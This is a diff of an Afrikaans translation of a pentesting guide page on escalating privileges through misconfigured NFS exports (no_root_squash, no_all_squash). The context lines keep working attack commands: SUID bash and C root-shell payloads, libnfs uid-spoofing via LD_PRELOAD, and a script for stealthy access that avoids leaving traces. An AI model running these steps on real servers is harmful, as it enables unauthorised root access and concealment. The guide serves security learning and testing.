@@ -19,11 +19,11 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 {% endhint %}
 
 
-Lees die _ **/etc/exports** _ lêer, as jy 'n gids vind wat geconfigureer is as **no\_root\_squash**, dan kan jy dit **toegang** vanaf **as 'n kliënt** en **binne** daardie gids **skryf** **asof** jy die plaaslike **root** van die masjien was.
+Lees die _ **/etc/exports** _ lêer, as jy 'n gids vind wat geconfigureer is as **no\_root\_squash**, dan kan jy dit **toegang** vanaf **as 'n kliënt** en **binne** daardie gids **skryf** **as**of jy die plaaslike **root** van die masjien was.
 
-**no\_root\_squash**: Hierdie opsie gee basies gesag aan die root-gebruiker op die kliënt om lêers op die NFS-bediener as root te benader. En dit kan lei tot ernstige sekuriteitsimplikasies.
+**no\_root\_squash**: Hierdie opsie gee basies gesag aan die root gebruiker op die kliënt om lêers op die NFS bediener as root te benader. En dit kan lei tot ernstige sekuriteitsimplikasies.
 
-**no\_all\_squash:** Dit is soortgelyk aan die **no\_root\_squash** opsie, maar dit geld vir **nie-root gebruikers**. Stel jou voor, jy het 'n shell as nobody gebruiker; het die /etc/exports lêer nagegaan; no\_all\_squash opsie is teenwoordig; kyk na die /etc/passwd lêer; emuleer 'n nie-root gebruiker; skep 'n suid lêer as daardie gebruiker (deur te monteer met nfs). Voer die suid uit as nobody gebruiker en word 'n ander gebruiker.
+**no\_all\_squash:** Dit is soortgelyk aan die **no\_root\_squash** opsie, maar dit geld vir **nie-root gebruikers**. Stel jou voor, jy het 'n shell as nobody gebruiker; het die /etc/exports lêer nagegaan; die no\_all\_squash opsie is teenwoordig; kyk na die /etc/passwd lêer; emuleer 'n nie-root gebruiker; skep 'n suid lêer as daardie gebruiker (deur te monteer met nfs). Voer die suid uit as nobody gebruiker en word 'n ander gebruiker.
 
 # Privilege Escalation
 
@@ -31,7 +31,7 @@ Lees die _ **/etc/exports** _ lêer, as jy 'n gids vind wat geconfigureer is as 
 
 As jy hierdie kwesbaarheid gevind het, kan jy dit benut:
 
-* **Monteer daardie gids** in 'n kliëntmasjien, en **as root kopieer** binne die gemonteerde gids die **/bin/bash** binêre en gee dit **SUID** regte, en **voerde** van die slagoffer masjien daardie bash binêre uit.
+* **Monteer daardie gids** in 'n kliënt masjien, en **as root kopieer** binne die gemonteerde gids die **/bin/bash** binêre en gee dit **SUID** regte, en **voerde** van die slagoffer masjien daardie bash binêre uit.
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -44,7 +44,7 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-* **Monteer daardie gids** op 'n kliëntmasjien, en **as root kopieer** binne die gemonteerde vouer ons saamgecompileerde payload wat die SUID-toestemming sal misbruik, gee vir dit **SUID** regte, en **voer vanaf die slagoffer** masjien daardie binêre uit (jy kan hier 'n paar [C SUID payloads](payloads-to-execute.md#c) vind).
+* **Monteer daardie gids** op 'n kliëntmasjien, en **as root kopieer** binne die gemonteerde gids ons saamgecompileerde payload wat die SUID-toestemming sal misbruik, gee dit **SUID** regte, en **voer van die slagoffer** masjien daardie binêre uit (jy kan hier 'n paar [C SUID payloads](payloads-to-execute.md#c) vind).
 ```bash
 #Attacker, as root user
 gcc payload.c -o payload
@@ -58,22 +58,22 @@ chmod +s payload
 cd <SHAREDD_FOLDER>
 ./payload #ROOT shell
 ```
-## Plaaslike Exploit
+## Local Exploit
 
 {% hint style="info" %}
-Let daarop dat as jy 'n **tunnel van jou masjien na die slagoffer masjien kan skep, jy steeds die Remote weergawe kan gebruik om hierdie privaatheidsverhoging te exploiteer deur die vereiste poorte te tunnelle**.\
-Die volgende truuk is in die geval waar die lêer `/etc/exports` **'n IP aandui**. In hierdie geval **sal jy in elk geval nie die **remote exploit** kan gebruik nie en jy sal hierdie truuk moet **misbruik**.\
+Let daarop dat as jy 'n **tunnel van jou masjien na die slagoffer masjien kan skep, jy steeds die Remote weergawe kan gebruik om hierdie privaatheidsverhoging te benut deur die vereiste poorte te tonnel**.\
+Die volgende truuk is in die geval waar die lêer `/etc/exports` **'n IP aandui**. In hierdie geval **sal jy nie in staat wees om** in enige geval die **remote exploit** te gebruik nie en jy sal hierdie truuk **moet misbruik**.\
 Nog 'n vereiste vir die exploit om te werk is dat **die eksport binne `/etc/export`** **die `insecure` vlag moet gebruik**.\
 \--_Ek is nie seker of hierdie truuk sal werk as `/etc/export` 'n IP adres aandui nie_--
 {% endhint %}
 
-## Basiese Inligting
+## Basic Information
 
-Die scenario behels die eksploitering van 'n gemonteerde NFS deel op 'n plaaslike masjien, wat 'n fout in die NFSv3 spesifikasie benut wat die kliënt toelaat om sy uid/gid te spesifiseer, wat moontlik ongeoorloofde toegang moontlik maak. Die eksploitering behels die gebruik van [libnfs](https://github.com/sahlberg/libnfs), 'n biblioteek wat die vervalsing van NFS RPC oproepe toelaat.
+Die scenario behels die benutting van 'n gemonteerde NFS deel op 'n plaaslike masjien, wat 'n fout in die NFSv3 spesifikasie benut wat die kliënt toelaat om sy uid/gid te spesifiseer, wat moontlik ongeoorloofde toegang moontlik maak. Die benutting behels die gebruik van [libnfs](https://github.com/sahlberg/libnfs), 'n biblioteek wat die vervalsing van NFS RPC oproepe toelaat.
 
-### Samevoeging van die Biblioteek
+### Compiling the Library
 
-Die biblioteek samevoegingsstappe mag aanpassings vereis gebaseer op die kern weergawe. In hierdie spesifieke geval was die fallocate syscalls uitgekommenteer. Die samevoegingsproses behels die volgende opdragte:
+Die biblioteek kompilasietappe mag aanpassings vereis gebaseer op die kern weergawe. In hierdie spesifieke geval is die fallocate syscalls uitkommentaar. Die kompilasieproses behels die volgende opdragte:
 ```bash
 ./bootstrap
 ./configure
@@ -91,7 +91,7 @@ int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
 
-2. **Plaas die exploit op die deel en verander sy toestemmings deur die uid te vervals:**
+2. **Plaas die exploit op die deel en wysig sy toestemmings deur die uid te vervals:**
 ```bash
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
@@ -106,7 +106,7 @@ LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs:/
 ```
 
 ## Bonus: NFShell vir Stealthy Lêertoegang
-Sodra root-toegang verkry is, om met die NFS-deel te kommunikeer sonder om eienaarskap te verander (om spore te vermy), word 'n Python-skrip (nfsh.py) gebruik. Hierdie skrip pas die uid aan om ooreen te stem met dié van die lêer wat toeganklik is, wat interaksie met lêers op die deel moontlik maak sonder toestemmingprobleme:
+Sodra root toegang verkry is, om met die NFS deel te kommunikeer sonder om eienaarskap te verander (om spore te vermy), word 'n Python-skrip (nfsh.py) gebruik. Hierdie skrip pas die uid aan om ooreen te stem met dié van die lêer wat toeganklik is, wat interaksie met lêers op die deel moontlik maak sonder toestemmingkwessies:
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
